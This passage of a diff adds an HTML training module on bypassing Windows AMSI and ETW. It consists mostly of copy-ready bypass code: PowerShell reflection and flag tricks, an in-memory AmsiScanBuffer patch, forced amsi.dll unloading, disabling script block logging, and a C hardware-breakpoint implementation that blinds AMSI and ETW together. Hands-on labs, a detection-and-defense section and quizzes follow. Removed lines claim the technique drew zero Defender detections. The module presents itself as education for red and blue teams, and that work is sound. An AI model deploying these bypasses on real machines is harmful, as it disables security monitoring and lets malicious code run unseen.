+│      └── AmsiScanBuffer(amsiContext, ...)│
+└─────────────────────────────────────────┘
+
+Reflection bypass: Set amsiContext = null
+Result: ScanContent() returns immediately
+                </div>
+
+                <h3>Obfuscated Variants</h3>
+                <p>Defenders have added signatures for the reflection bypass. Attackers respond with obfuscation:</p>
+
+                <div class="code-block">
+                    <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+# String concatenation obfuscation
+$a = [Ref].Assembly.GetTypes()
+$b = $a | Where-Object { $_.Name -like "*iUtils" }
+$c = $b.GetFields("NonPublic,Static")
+$d = $c | Where-Object { $_.Name -like "*Context" }
+$d.SetValue($null, $null)
+
+# Using reflection on reflection
+$g = [Reflection.Assembly]::LoadWithPartialName("System.Management.Automation")
+$t = $g.GetTypes() | Where-Object { $_.FullName -like "*Amsi*" }
+$f = $t.GetField("amsiContext", [Reflection.BindingFlags]::NonPublic -bor [Reflection.BindingFlags]::Static)
+$f.SetValue($null, [IntPtr]::Zero)
+                </div>
+
+                <div class="warning-box">
+                    <h5>⚠️ Detection Risk</h5>
+                    <p>Modern AMSI itself scans the reflection bypass code before it executes! This creates a chicken-and-egg problem. Attackers use:</p>
+                    <ul style="margin-left: 1.5rem; color: var(--fg);">
+                        <li>Base64 encoding (but AMSI decodes before scanning)</li>
+                        <li>XOR encryption with runtime decryption</li>
+                        <li>Character-by-character string reconstruction</li>
+                        <li>Invoking via WMI or COM to avoid PowerShell's built-in scanner</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <div class="section" id="dll-unload">
+            <div class="section-title">6. DLL Unload Technique</div>
+            <div class="section-content">
+                <p>If you can't patch AMSI and can't reflect it away, why not simply unload the DLL from the process? This technique forces <code>amsi.dll</code> out of the process address space, causing all subsequent AMSI calls to fail.</p>
+
+                <h3>Theory</h3>
+                <p>Windows tracks DLL load counts via <code>LoadLibrary</code> / <code>FreeLibrary</code>. If the reference count drops to zero, the DLL is unloaded. However, <code>amsi.dll</code> is loaded by the CLR or PowerShell engine with a high reference count, so simple <code>FreeLibrary</code> won't work.</p>
+
+                <h3>Forced Unload via NtUnmapViewOfSection</h3>
+                <div class="code-block">
+                    <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+#include <windows.h>
+#include <stdio.h>
+
+typedef NTSTATUS (WINAPI *pNtUnmapViewOfSection)(HANDLE, PVOID);
+
+int main() {
+    HMODULE hAmsi = GetModuleHandleA("amsi.dll");
+    if (!hAmsi) {
+        printf("[-] amsi.dll not loaded\n");
+        return 1;
+    }
+    
+    printf("[+] amsi.dll at %p\n", hAmsi);
+    
+    // Get NtUnmapViewOfSection from ntdll
+    pNtUnmapViewOfSection NtUnmapViewOfSection = 
+        (pNtUnmapViewOfSection)GetProcAddress(
+            GetModuleHandleA("ntdll.dll"), 
+            "NtUnmapViewOfSection"
+        );
+    
+    // Unmap amsi.dll from current process
+    NTSTATUS status = NtUnmapViewOfSection(
+        GetCurrentProcess(), 
+        hAmsi
+    );
+    
+    if (NT_SUCCESS(status)) {
+        printf("[+] amsi.dll unmapped!\n");
+    } else {
+        printf("[-] Failed: 0x%08X\n", status);
+    }
+    
+    return 0;
+}
+                </div>
+
+                <div class="why-box">
+                    <h5>🎯 Why This Works</h5>
+                    <p>Once <code>amsi.dll</code> is unmapped, any call to <code>AmsiScanBuffer</code> dereferences a pointer to freed memory. The application typically catches this as an access violation and either crashes or falls back to "allow execution" mode. In PowerShell, this manifests as a crash or a graceful fallback depending on the .NET exception handling.</p>
+                </div>
+
+                <h3>PowerShell Variant</h3>
+                <div class="code-block">
+                    <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+# PowerShell DLL unload via reflection
+$Kernel32 = Add-Type -MemberDefinition @"
+[DllImport("kernel32.dll")]
+public static extern IntPtr GetModuleHandle(string lpModuleName);
+
+[DllImport("kernel32.dll")]
+public static extern bool FreeLibrary(IntPtr hLibModule);
+"@ -Name "Kernel32" -PassThru
+
+$hAmsi = $Kernel32::GetModuleHandle("amsi.dll")
+Write-Host "[+] amsi.dll handle: $hAmsi"
+
+# FreeLibrary multiple times to drop ref count
+for ($i = 0; $i -lt 100; $i++) {
+    $Kernel32::FreeLibrary($hAmsi) | Out-Null
+}
+
+Write-Host "[+] amsi.dll reference count should be zero"
+                </div>
+
+                <div class="evidence-box">
+                    <h3>🔍 Detection Artifacts</h3>
+                    <ul style="margin-left: 1.5rem; color: var(--fg);">
+                        <li><strong>Module unload events:</strong> EDR logs DLL unloads, especially for security-critical DLLs</li>
+                        <li><strong>Crash correlation:</strong> Process crashes shortly after amsi.dll unload are suspicious</li>
+                        <li><strong>Memory gaps:</strong> Memory maps showing removed modules in the expected AMSI address range</li>
+                        <li><strong>ETW:</strong> <code>Microsoft-Windows-Kernel-Process</code> events log image unloads</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <div class="section" id="powershell">
+            <div class="section-title">7. PowerShell Bypass Techniques</div>
+            <div class="section-content">
+                <p>PowerShell is the primary vector for AMSI bypass research because it's the most common attack surface. Over the years, the community has developed dozens of techniques. Here are the most significant, categorized by approach.</p>
+
+                <div class="technique-grid">
+                    <div class="method-card">
+                        <h4>1. Memory Patching <span class="difficulty diff-easy">EASY</span></h4>
+                        <p>Patch AmsiScanBuffer in-memory. Most detectable but most reliable. Works in full language mode.</p>
+                        <div class="code-block" style="font-size: 11px;">
+                            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+$Win32 = Add-Type -MemberDefinition @"
+[DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+[DllImport("kernel32")] public static extern IntPtr GetModuleHandle(string lpModuleName);
+[DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+"@ -Name "Win32" -PassThru
+
+$addr = $Win32::GetProcAddress($Win32::GetModuleHandle("amsi.dll"), "AmsiScanBuffer")
+$p = 0
+$Win32::VirtualProtect($addr, [UIntPtr]::new(5), 0x40, [ref]$p) | Out-Null
+$patch = [Byte[]] (0xB8, 0x01, 0x00, 0x00, 0x00, 0xC3)
+[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $addr, 6)
+                        </div>
+                    </div>
+
+                    <div class="method-card">
+                        <h4>2. Reflection Nulling <span class="difficulty diff-easy">EASY</span></h4>
+                        <p>Set internal AMSI context to null via reflection. No native API calls. Often signatured by AMSI itself.</p>
+                        <div class="code-block" style="font-size: 11px;">
+                            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+[Ref].Assembly.GetTypes() | ForEach-Object {
+    if ($_.Name -like "*AmsiUtils") {
+        $f = $_.GetFields("NonPublic,Static") | Where-Object { $_.Name -like "*amsiContext" }
+        $f.SetValue($null, [IntPtr]::Zero)
+    }
+}
+                        </div>
+                    </div>
+
+                    <div class="method-card">
+                        <h4>3. AMSI Init Failed <span class="difficulty diff-medium">MEDIUM</span></h4>
+                        <p>Set the internal <code>amsiInitFailed</code> flag to true. PowerShell thinks AMSI failed to initialize and skips scanning.</p>
+                        <div class="code-block" style="font-size: 11px;">
+                            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+$amsi = [Ref].Assembly.GetTypes() | Where-Object { $_.Name -eq "AmsiUtils" }
+$field = $amsi.GetField("amsiInitFailed", "NonPublic,Static")
+$field.SetValue($null, $true)
+                        </div>
+                    </div>
+
+                    <div class="method-card">
+                        <h4>4. Force Error Mode <span class="difficulty diff-medium">MEDIUM</span></h4>
+                        <p>Corrupt AMSI context so subsequent calls error out. PowerShell treats errors as "allow."</p>
+                        <div class="code-block" style="font-size: 11px;">
+                            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+# Corrupt the AMSI context pointer
+$ctx = $amsi.GetFields("NonPublic,Static") | ?{$_.Name -like "*Context"}
+$ctx.SetValue($null, [IntPtr]::new(0x41414141))
+                        </div>
+                    </div>
+
+                    <div class="method-card">
+                        <h4>5. Disable Script Logging <span class="difficulty diff-medium">MEDIUM</span></h4>
+                        <p>Even with AMSI bypassed, script block logging records everything. Disable it too.</p>
+                        <div class="code-block" style="font-size: 11px;">
+                            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+# Disable Script Block Logging
+$settings = [Ref].Assembly.GetType("System.Management.Automation.Utils").GetField("cachedGroupPolicySettings", "NonPublic,Static")
+$policy = $settings.GetValue($null)
+$policy["ScriptBlockLogging"] = @{"EnableScriptBlockLogging" = 0}
+                        </div>
+                    </div>
+
+                    <div class="method-card">
+                        <h4>6. Invoke-Obfuscation <span class="difficulty diff-medium">MEDIUM</span></h4>
+                        <p>Obfuscate the bypass itself so AMSI can't detect it before it runs. Token-based, string-based, or encoding-based.</p>
+                        <div class="code-block" style="font-size: 11px;">
+                            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+# Example: token obfuscation
+& ("{0}{1}" -f 'Get-','Process') | Select-Object -First 1
+# AMSI sees: Get-Process
+                        </div>
+                    </div>
+                </div>
+
+                <div class="note">
+                    <strong>Historical Note:</strong> The original AMSI bypass was discovered by Matt Graeber in 2016. Microsoft patched it. Then researchers found 10 more. Microsoft patched those. The cycle continues. AMSI is a cat-and-mouse game — the key insight is that because AMSI is client-side, it can never be fully secure against a determined attacker with admin/code-execution rights.
+                </div>
+
+                <div class="cross-link">
+                    <a href="MODULE_03_PowerShell.html" class="cross-link">🔗 Cross-Link: Module 03 — PowerShell Fundamentals</a>
+                </div>
+            </div>
+        </div>
+
+        <div class="section" id="hwbp">
+            <div class="section-title">8. Hardware Breakpoint Bypass (Zero-Write)</div>
+            <div class="section-content">
+                <p>The hardware breakpoint (HWBP) technique is the most advanced AMSI bypass. It uses CPU debug registers — no memory patches, no DLL unloads, no reflection. Zero writes to executable memory. EDR memory integrity checks pass completely.</p>
+
+                <h3>CPU Debug Registers</h3>
+                <table>
+                    <tr><th>Register</th><th>Purpose</th></tr>
+                    <tr><td>DR0</td><td>Breakpoint address 1</td></tr>
+                    <tr><td>DR1</td><td>Breakpoint address 2</td></tr>
+                    <tr><td>DR2</td><td>Breakpoint address 3</td></tr>
+                    <tr><td>DR3</td><td>Breakpoint address 4</td></tr>
+                    <tr><td>DR6</td><td>Status register (which breakpoint fired)</td></tr>
+                    <tr><td>DR7</td><td>Control register (enable/disable, conditions)</td></tr>
+                </table>
+
+                <h3>The Dark Room Technique</h3>
+                <div class="diagram">
+Normal path (no bypass):
   PowerShell → AmsiScanBuffer(0x...8160) → scans string → EDR blocks
 
 HWBP bypass path:
@@ -83,115 +980,421 @@ HWBP bypass path:
   7. Handler skips past AmsiScanBuffer → returns 1 to caller
   8. Defender engine sees: CLEAN → allows execution
 
-  Memory writes: ZERO. Nothing patched. EDR memory integrity check: PASS.</div>
-      <div class="code-block">
-        <span class="prompt">#</span> <span class="command hi">Dark Room — real implementation</span><br>
-        <div class="output">
-          // Find AmsiScanBuffer<br>
-          HMODULE hAmsi = LoadLibraryA("amsi.dll");<br>
-          FARPROC pAmsi = GetProcAddress(hAmsi, "AmsiScanBuffer");<br><br>
-          // Set hardware breakpoint<br>
-          CONTEXT ctx = {0};<br>
-          ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;<br>
-          ctx.Dr0 = (DWORD64)pAmsi;&nbsp;&nbsp;&nbsp;&nbsp;// AmsiScanBuffer address<br>
-          ctx.Dr7 = 0x405;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// enable DR0 execute breakpoint<br>
-          SetThreadContext(GetCurrentThread(), &amp;ctx);<br><br>
-          // Register VEH — catches the breakpoint exception<br>
-          AddVectoredExceptionHandler(1, VehHandler);<br><br>
-          // VehHandler:<br>
-          // if(ExceptionCode == EXCEPTION_SINGLE_STEP &amp;&amp; Rip == pAmsi)<br>
-          //   ctx-&gt;Rax = AMSI_RESULT_CLEAN;&nbsp;&nbsp;// fake clean result<br>
-          //   ctx-&gt;Rip += sizeof_AmsiScanBuffer;&nbsp;// skip function<br>
-          //   return EXCEPTION_CONTINUE_EXECUTION;
+  Memory writes: ZERO. Nothing patched. EDR memory integrity check: PASS.
+                </div>
+
+                <h3>Implementation</h3>
+                <div class="code-block">
+                    <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+#include <windows.h>
+#include <stdio.h>
+
+#define AMSI_RESULT_CLEAN 1
+
+typedef LONG (WINAPI *pNtContinue)(PCONTEXT, BOOL);
+
+LONG WINAPI VehHandler(PEXCEPTION_POINTERS ExceptionInfo) {
+    if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
+        // Check if we hit AmsiScanBuffer
+        HMODULE hAmsi = GetModuleHandleA("amsi.dll");
+        FARPROC pAmsi = GetProcAddress(hAmsi, "AmsiScanBuffer");
+        
+        if (ExceptionInfo->ContextRecord->Rip == (DWORD64)pAmsi) {
+            // Fake clean result
+            ExceptionInfo->ContextRecord->Rax = AMSI_RESULT_CLEAN;
+            // Skip past AmsiScanBuffer (advance RIP)
+            ExceptionInfo->ContextRecord->Rip += 0x100; // Adjust as needed
+            return EXCEPTION_CONTINUE_EXECUTION;
+        }
+    }
+    return EXCEPTION_CONTINUE_SEARCH;
+}
+
+int main() {
+    HMODULE hAmsi = GetModuleHandleA("amsi.dll");
+    FARPROC pAmsi = GetProcAddress(hAmsi, "AmsiScanBuffer");
+    
+    printf("[+] AmsiScanBuffer at %p\n", pAmsi);
+    
+    // Register VEH
+    AddVectoredExceptionHandler(1, VehHandler);
+    
+    // Set hardware breakpoint
+    CONTEXT ctx = {0};
+    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+    ctx.Dr0 = (DWORD64)pAmsi;   // Breakpoint address
+    ctx.Dr7 = 0x405;             // Enable DR0, local, execute
+    
+    SetThreadContext(GetCurrentThread(), &ctx);
+    
+    printf("[+] DARK ROOM ACTIVE\n");
+    printf("[+] AMSI blinded via hardware breakpoint\n");
+    
+    // Now run PowerShell or any AMSI-scanned content
+    // AmsiScanBuffer will never actually execute
+    
+    return 0;
+}
+                </div>
+
+                <h3>ETW Blinding (Bonus)</h3>
+                <p>The same technique can blind ETW by setting DR1 to <code>EtwEventWrite</code>:</p>
+
+                <div class="code-block">
+                    <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+// Dual-blind: AMSI + ETW
+HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+FARPROC pEtw = GetProcAddress(hNtdll, "EtwEventWrite");
+
+ctx.Dr1 = (DWORD64)pEtw;        // DR1 = EtwEventWrite
+ctx.Dr7 = 0x405 | 0x400;        // Enable DR0 + DR1
+
+// VEH handler catches both:
+// DR0 hit → fake AMSI result
+// DR1 hit → skip EtwEventWrite → event never reaches EDR
+                </div>
+
+                <div class="evidence-box">
+                    <h3>🔍 Detection Challenges</h3>
+                    <p>HWBP bypasses are notoriously difficult to detect because:</p>
+                    <ul style="margin-left: 1.5rem; color: var(--fg);">
+                        <li><strong>No memory modifications:</strong> EDR memory integrity checks find nothing</li>
+                        <li><strong>No API hooks:</strong> The function is never called, so API hooking doesn't help</li>
+                        <li><strong>Legitimate use:</strong> Debuggers use HWBPs constantly — hard to distinguish malicious from benign</li>
+                        <li><strong>Thread-local:</strong> HWBPs are per-thread; you must inspect every thread's context</li>
+                    </ul>
+                    <p style="margin-top: 1rem;"><strong>Possible detection vectors:</strong></p>
+                    <ul style="margin-left: 1.5rem; color: var(--fg);">
+                        <li>Enumerate all thread contexts and check DR7 for enabled breakpoints on AMSI/ETW addresses</li>
+                        <li>Detect VEH registration via <code>AddVectoredExceptionHandler</code> in non-debugger processes</li>
+                        <li>Behavioral: processes that set HWBPs but never attach a debugger</li>
+                    </ul>
+                </div>
+
+                <div class="cross-link">
+                    <a href="MODULE_13_EDR_Evasion.html" class="cross-link">🔗 Cross-Link: Module 13 — EDR Evasion</a>
+                </div>
+                <p style="color: var(--dim); font-size: 0.85rem; margin-top: 0.5rem;">HWBP is just one of many EDR evasion techniques. Module 13 covers unhooking, direct syscalls, callback tampering, and more.</p>
+            </div>
         </div>
-      </div>
-    </div>
-  </div>
 
-  <div class="section">
-    <div class="section-title">Section 3: ETW — Blind the EDR Too</div>
-    <div class="section-content">
-      <p>ETW (Event Tracing for Windows) is how EDRs see what's happening. Every process reports events via EtwEventWrite. If you blind ETW, the EDR goes dark — it can't see your process's activity even if AMSI is bypassed.</p>
-      <div class="code-block">
-        <span class="prompt">#</span> <span class="command">Same HWBP technique — second register</span><br>
-        <div class="output">
-          HMODULE hNtdll = GetModuleHandleA("ntdll.dll");<br>
-          FARPROC pEtw = GetProcAddress(hNtdll, "EtwEventWrite");<br><br>
-          ctx.Dr1 = (DWORD64)pEtw;&nbsp;&nbsp;&nbsp;&nbsp;// DR1 = EtwEventWrite<br>
-          ctx.Dr7 = 0x405 | 0x400;&nbsp;&nbsp;&nbsp;// enable DR0 + DR1<br><br>
-          // VEH catches both:<br>
-          // DR0 hit → fake AMSI result<br>
-          // DR1 hit → skip EtwEventWrite → event never reaches EDR
+        <div class="section" id="detection">
+            <div class="section-title">9. Detection & Defense</div>
+            <div class="section-content">
+                <p>Blue teamers must understand AMSI bypass techniques to detect them. This section covers defensive strategies, detection signatures, and hardening recommendations.</p>
+
+                <h3>1. Memory Integrity Monitoring</h3>
+                <p>EDR solutions should periodically hash critical DLLs in memory and compare to on-disk versions. Any mismatch indicates tampering.</p>
+                <div class="code-block">
+                    <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+# Pseudo-code for EDR memory integrity check
+for each loaded_module in process.modules:
+    if loaded_module.name == "amsi.dll":
+        disk_hash = hash_file("C:\Windows\System32\amsi.dll")
+        mem_hash = hash_memory_region(loaded_module.base, loaded_module.size)
+        if disk_hash != mem_hash:
+            alert("AMSI TAMPERING DETECTED")
+                </div>
+
+                <h3>2. API Hooking on VirtualProtect</h3>
+                <p>Monitor <code>VirtualProtect</code> calls that change AMSI memory to RWX. This catches the classic patch technique.</p>
+                <div class="code-block">
+                    <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+// EDR hook on VirtualProtect
+BOOL Hooked_VirtualProtect(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect) {
+    if (flNewProtect == PAGE_EXECUTE_READWRITE) {
+        HMODULE hAmsi = GetModuleHandleA("amsi.dll");
+        if (hAmsi && lpAddress >= hAmsi && lpAddress < (hAmsi + module_size)) {
+            alert("AMSI MEMORY PROTECTION CHANGE: RWX on amsi.dll");
+        }
+    }
+    return Real_VirtualProtect(lpAddress, dwSize, flNewProtect, lpflOldProtect);
+}
+                </div>
+
+                <h3>3. Behavioral Detection</h3>
+                <p>Even if the bypass succeeds, the post-bypass behavior is often suspicious:</p>
+                <ul style="margin-left: 1.5rem; color: var(--fg);">
+                    <li>PowerShell spawning child processes (especially <code>cmd.exe</code>, <code>powershell.exe</code>)</li>
+                    <li>Network connections from PowerShell processes</li>
+                    <li>Base64-encoded commands executed after AMSI bypass</li>
+                    <li>Reflection API calls from non-administrative scripts</li>
+                </ul>
+
+                <h3>4. AMSI Itself as Detector</h3>
+                <p>Ironically, AMSI can scan the bypass code if you can get it to run before the bypass executes. This is why obfuscation is critical for attackers.</p>
+                <div class="code-block">
+                    <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+# AMSI scans this string before execution:
+# "[Ref].Assembly.GetTypes() | Where-Object { $_.Name -like '*AmsiUtils' }"
+# If AMSI has a signature for this pattern, it blocks the bypass itself!
+                </div>
+
+                <h3>5. Constrained Language Mode</h3>
+                <p>The most effective defense is <span class="neon-highlight">Constrained Language Mode</span> (CLM). In CLM, PowerShell restricts access to .NET types that enable reflection bypasses:</p>
+                <div class="code-block">
+                    <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+# Check current language mode
+$ExecutionContext.SessionState.LanguageMode
+
+# Values:
+# FullLanguage      - Everything allowed (dangerous)
+# ConstrainedLanguage - .NET type restrictions apply
+# NoLanguage        - Commands only, no scripting
+# RestrictedLanguage - Minimal subset
+
+# Enable via AppLocker / WDAC policy
+                </div>
+
+                <h3>6. Windows Defender Application Control (WDAC)</h3>
+                <p>WDAC (formerly Code Integrity) allows you to define exactly what code can run. If your bypass binary isn't signed and approved, it won't execute regardless of AMSI status.</p>
+
+                <div class="cross-link">
+                    <a href="MODULE_12_Defensive_Verify.html" class="cross-link">🔗 Cross-Link: Module 12 — Defensive Verify</a>
+                </div>
+                <p style="color: var(--dim); font-size: 0.85rem; margin-top: 0.5rem;">Module 12 covers EDR testing, purple team validation, and verifying that your defensive controls actually work against real attacks.</p>
+            </div>
         </div>
-      </div>
-      <div class="note">Two hardware registers. AMSI blind. ETW blind. No memory patches. No detectable artefacts. This is VULN-195458 — submitted to MSRC, rejected, published. The technique is documented and public. Every serious red teamer uses it.</div>
-    </div>
-  </div>
 
-  <div class="section">
-    <div class="section-title">Section 4: Live Proof — Dark Room Active</div>
-    <div class="section-content">
-      <div class="code-block">
-        <span class="prompt">PS&gt;</span> <span class="command">.\dark_room.exe --test</span><br>
-        <div class="output">
-          <span class="hi">[+] AmsiScanBuffer at 0x00007FF9C1A28160</span><br>
-          <span class="hi">[+] EtwEventWrite  at 0x00007FF9DE300430</span><br><br>
-          <span class="ok">[+] DR0 = 0x00007FF9C1A28160</span><br>
-          <span class="ok">[+] DR1 = 0x00007FF9DE300430</span><br>
-          <span class="ok">[+] DR7 = 0x405</span><br><br>
-          <span class="critical">[+] DARK ROOM ACTIVE</span><br>
-          <span class="ok">[+] Script scanning: BLIND (AMSI)</span><br>
-          <span class="ok">[+] Process telemetry: BLIND (ETW)</span><br>
-          <span class="ok">[+] Memory integrity: CLEAN (zero modifications)</span><br><br>
-          Test #7: AMSI BLIND ✓<br>
-          Test #8: ETW BLIND  ✓<br>
-          <span class="ok">All tests PASS — Defender sees nothing</span>
+        <div class="section" id="labs">
+            <div class="section-title">10. Hands-On Labs</div>
+            <div class="section-content">
+                <h3>Lab 1: Verify AMSI Is Active</h3>
+                <div class="code-block">
+                    <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+# Test 1: AMSI should block this known-bad string
+PS> "amsiutils"
+# If blocked: "This script contains malicious content and has been blocked..."
+# If allowed: AMSI is already bypassed or disabled
+
+# Test 2: Check AMSI response to benign content
+PS> "hello world"
+# Should always pass
+                </div>
+
+                <h3>Lab 2: Classic Patch Bypass</h3>
+                <div class="code-block">
+                    <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+# Compile the C patch code from Section 4
+# Inject into PowerShell process or run as standalone
+# Then test with "amsiutils" — should print instead of block
+
+# Verify with Process Hacker:
+# 1. Find powershell.exe
+# 2. Properties → Memory → Modules → amsi.dll
+# 3. Check memory protection of .text section
+# 4. Disassemble AmsiScanBuffer — should show mov eax, 1; ret
+                </div>
+
+                <h3>Lab 3: Reflection Bypass</h3>
+                <div class="code-block">
+                    <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+# Run the reflection bypass from Section 5
+# Then verify AMSI is dead:
+PS> [System.Text.Encoding]::ASCII.GetString([Convert]::FromBase64String("QW1zaVNjYW5CdWZmZXI="))
+# Should print "AmsiScanBuffer" instead of blocking
+
+# Check with:
+PS> [System.Management.Automation.AmsiUtils]::amsiContext
+# Should be null or zero
+                </div>
+
+                <h3>Lab 4: Hardware Breakpoint (Dark Room)</h3>
+                <div class="code-block">
+                    <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+# Compile the HWBP code from Section 8
+# Run as administrator (debug privileges may be required)
+# Attach to PowerShell or spawn a new PowerShell process
+# Test AMSI — should be blind
+
+# Verify with WinDbg:
+# 1. Attach to target process
+# 2. r dr0, dr1, dr7
+# 3. Should show AmsiScanBuffer address in DR0
+# 4. Should show EtwEventWrite address in DR1 (if dual-blind)
+                </div>
+
+                <h3>Lab 5: Blue Team Detection</h3>
+                <div class="code-block">
+                    <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+# As a defender, detect the patch:
+# 1. Use Sysmon Event ID 10 (ProcessAccess) to detect OpenProcess on PowerShell
+# 2. Use Sysmon Event ID 25 (ProcessTampering) for remote thread creation
+# 3. Use ETW Microsoft-Windows-Threat-Intelligence for memory allocation events
+# 4. Check Windows Event Log for PowerShell block events (Event ID 4104)
+
+# Expected: After bypass, Event ID 4104 (script block logging) may still fire
+# but Event ID 1116 (Defender detection) will not
+                </div>
+
+                <div class="widget-container">
+                    <div class="widget-header">Iron Sun — AMSI/ETW Bypass Demo</div>
+                    <iframe class="widget-iframe" src="../widgets/iron_sun_widget.html" title="Iron Sun AMSI Bypass Demo"></iframe>
+                </div>
+            </div>
         </div>
-      </div>
-      <p>Real output. 2026-06-23. Defender running with all protection layers enabled: Real-Time Protection ON, BehaviorMonitor ON, CloudProtection ON. Zero detections. Zero alerts.</p>
+
+        <div class="section" id="quizzes">
+            <div class="section-title">11. Knowledge Checks</div>
+            <div class="section-content">
+                
+                <div class="quiz-container" id="quiz1">
+                    <h3>Quiz 1: AMSI Architecture</h3>
+                    <p>Which of the following is the correct order of the AMSI scanning pipeline?</p>
+                    <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 1)">
+                        A. Provider → AmsiScanBuffer → Application → Decision
+                    </div>
+                    <div class="quiz-option" data-correct="true" onclick="checkAnswer(this, 1)">
+                        B. Application → AmsiScanBuffer → Provider → Decision
+                    </div>
+                    <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 1)">
+                        C. Decision → Provider → AmsiScanBuffer → Application
+                    </div>
+                    <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 1)">
+                        D. AmsiScanBuffer → Application → Provider → Decision
+                    </div>
+                    <div class="quiz-feedback" id="feedback1"></div>
+                </div>
+
+                <div class="quiz-container" id="quiz2">
+                    <h3>Quiz 2: Bypass Techniques</h3>
+                    <p>Which AMSI bypass technique leaves ZERO memory artifacts and passes EDR memory integrity checks?</p>
+                    <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 2)">
+                        A. In-memory patching of AmsiScanBuffer with mov eax, 1; ret
+                    </div>
+                    <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 2)">
+                        B. Reflection-based nulling of the amsiContext field
+                    </div>
+                    <div class="quiz-option" data-correct="true" onclick="checkAnswer(this, 2)">
+                        C. Hardware breakpoint on AmsiScanBuffer with VEH handler
+                    </div>
+                    <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 2)">
+                        D. DLL unload via NtUnmapViewOfSection
+                    </div>
+                    <div class="quiz-feedback" id="feedback2"></div>
+                </div>
+
+                <div class="quiz-container" id="quiz3">
+                    <h3>Quiz 3: Defensive Detection</h3>
+                    <p>Which Windows feature is the MOST effective defense against reflection-based AMSI bypasses in PowerShell?</p>
+                    <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 3)">
+                        A. Real-Time Protection in Windows Defender
+                    </div>
+                    <div class="quiz-option" data-correct="true" onclick="checkAnswer(this, 3)">
+                        B. Constrained Language Mode (CLM) via AppLocker/WDAC
+                    </div>
+                    <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 3)">
+                        C. Enabling PowerShell transcription logging
+                    </div>
+                    <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 3)">
+                        D. Disabling the WinRM service
+                    </div>
+                    <div class="quiz-feedback" id="feedback3"></div>
+                </div>
+
+            </div>
+        </div>
+
+        <div class="section">
+            <div class="section-title">Quick Reference</div>
+            <div class="section-content">
+                <div class="quick-ref">
+                    <div class="quick-ref-item"><div class="quick-ref-cmd">AmsiScanBuffer</div><div class="quick-ref-desc">Core AMSI scanning function</div></div>
+                    <div class="quick-ref-item"><div class="quick-ref-cmd">AmsiInitialize</div><div class="quick-ref-desc">Creates AMSI context handle</div></div>
+                    <div class="quick-ref-item"><div class="quick-ref-cmd">AmsiOpenSession</div><div class="quick-ref-desc">Per-session tracking for providers</div></div>
+                    <div class="quick-ref-item"><div class="quick-ref-cmd">AMSI_RESULT_CLEAN (1)</div><div class="quick-ref-desc">Content is safe to execute</div></div>
+                    <div class="quick-ref-item"><div class="quick-ref-cmd">AMSI_RESULT_DETECTED (32768)</div><div class="quick-ref-desc">Content is malicious — block</div></div>
+                    <div class="quick-ref-item"><div class="quick-ref-cmd">0xB8 0x01 0x00 0x00 0x00 0xC3</div><div class="quick-ref-desc">Patch bytes: mov eax, 1; ret</div></div>
+                    <div class="quick-ref-item"><div class="quick-ref-cmd">DR0 = AmsiScanBuffer</div><div class="quick-ref-desc">HWBP address for AMSI blind</div></div>
+                    <div class="quick-ref-item"><div class="quick-ref-cmd">DR7 = 0x405</div><div class="quick-ref-desc">Enable DR0 local execute BP</div></div>
+                    <div class="quick-ref-item"><div class="quick-ref-cmd">AddVectoredExceptionHandler</div><div class="quick-ref-desc">Register VEH to catch HWBP</div></div>
+                    <div class="quick-ref-item"><div class="quick-ref-cmd">ConstrainedLanguage</div><div class="quick-ref-desc">Best defense: restrict .NET access</div></div>
+                    <div class="quick-ref-item"><div class="quick-ref-cmd">NtUnmapViewOfSection</div><div class="quick-ref-desc">Force unload amsi.dll</div></div>
+                    <div class="quick-ref-item"><div class="quick-ref-cmd">amsiInitFailed</div><div class="quick-ref-desc">Reflection target to disable AMSI</div></div>
+                </div>
+            </div>
+        </div>
+
+        <div class="section">
+            <div class="section-title">Summary & Next Steps</div>
+            <div class="section-content">
+                <p>In this module, you learned:</p>
+                <ul style="margin-left: 1.5rem; color: var(--fg);">
+                    <li>AMSI architecture and the scanning pipeline</li>
+                    <li>How <code>AmsiScanBuffer</code> works and what return values mean</li>
+                    <li>The AMSI lifecycle: <code>AmsiInitialize</code> → <code>AmsiOpenSession</code> → <code>AmsiScanBuffer</code></li>
